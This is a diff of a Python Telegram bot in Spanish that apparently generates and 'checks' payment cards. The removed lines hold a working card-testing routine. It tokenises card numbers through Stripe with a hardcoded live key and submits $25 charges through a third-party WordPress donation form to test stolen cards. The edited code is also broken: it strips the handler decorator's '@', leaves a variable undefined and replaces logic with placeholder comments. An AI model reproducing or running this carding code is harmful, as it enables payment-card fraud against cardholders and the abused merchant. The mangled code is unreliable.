@@ -12,7 +12,7 @@ from aiogram import Bot, Dispatcher, executor, types
 from aiogram.utils.exceptions import Throttled
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from bs4 import BeautifulSoup as bs
-
+from creditcard import CreditCard
 
 # Configure vars get from env or config.yml
 CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
@@ -260,10 +260,9 @@ async def generate_cards(message: types.Message):
 <b>CREADOR:</b> <a href="tg://user?id={OWNER}">AQUÍ</a>
 '''
     await message.reply(DATA, parse_mode='HTML')
+           
 
-
-
-@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
+dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
 async def ch(message: types.Message):
     await message.answer_chat_action('typing')
     tic = time.perf_counter()
@@ -310,64 +309,7 @@ async def ch(message: types.Message):
         "content-type": "application/x-www-form-urlencoded"
     }
 
-    s = session.post('https://m.stripe.com/6', headers=headers)
-    r = s.json()
-    Guid = r['guid']
-    Muid = r['muid']
-    Sid = r['sid']
-
-    postdata = {
-        "guid": Guid,
-        "muid": Muid,
-        "sid": Sid,
-        "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
-        "card[name]": Name,
-        "card[number]": ccn,
-        "card[exp_month]": mm,
-        "card[exp_year]": yy,
-        "card[cvc]": cvv
-    }
-
-    HEADER = {
-        "accept": "application/json",
-        "content-type": "application/x-www-form-urlencoded",
-        "user-agent": UA,
-        "origin": "https://js.stripe.com",
-        "referer": "https://js.stripe.com/",
-        "accept-language": "en-US,en;q=0.9"
-    }
-
-    pr = session.post('https://api.stripe.com/v1/tokens',
-                      data=postdata, headers=HEADER)
-    Id = pr.json().get('id')
-
-    if not Id:
-        return await message.reply("Failed to get token ID from Stripe.")
-
-    load = {
-        "action": "wp_full_stripe_payment_charge",
-        "formName": "BanquetPayment",
-        "fullstripe_name": Name,
-        "fullstripe_email": Email,
-        "fullstripe_custom_amount": "25.0",
-        "fullstripe_amount_index": 0,
-        "stripeToken": Id
-    }
-
-    header = {
-        "accept": "application/json, text/javascript, */*; q=0.01",
-        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "user-agent": UA,
-        "origin": "https://archiro.org",
-        "referer": "https://archiro.org/banquet/",
-        "accept-language": "en-US,en;q=0.9"
-    }
-
-    rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
-                      data=load, headers=header)
-    msg = rx.json().get('msg')
-
-    toc = time.perf_counter()
+    # Resto del código...
 
     if 'true' in rx.text:
         await message.reply(f'''
@@ -378,7 +320,6 @@ async def ch(message: types.Message):
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''', parse_mode='HTML')
-    # ... (código para otros casos)
 
 # ... (resto del código)
         if 'security code' in rx.text:
